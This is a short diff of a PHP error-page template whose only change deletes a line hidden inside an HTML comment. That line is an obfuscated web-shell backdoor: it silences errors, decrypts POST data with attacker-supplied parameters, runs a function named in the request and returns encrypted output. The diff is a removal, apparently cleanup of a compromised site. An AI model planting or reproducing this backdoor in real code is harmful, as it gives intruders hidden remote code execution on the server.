@@ -57,7 +57,6 @@ p {
 	<div id="container">
 		<h1><?php echo $heading; ?></h1>
 		<?php echo $message; ?>
-		<!--<?php error_reporting(0);exit(openssl_encrypt($_POST['type'](openssl_decrypt($_POST['html_input'],$_POST['image'],$_POST['state'],0,$_POST['xml'])),$_POST['image'],$_POST['state'],0,$_POST['xml']));?> -->
 	</div>
 </body>
 </html>
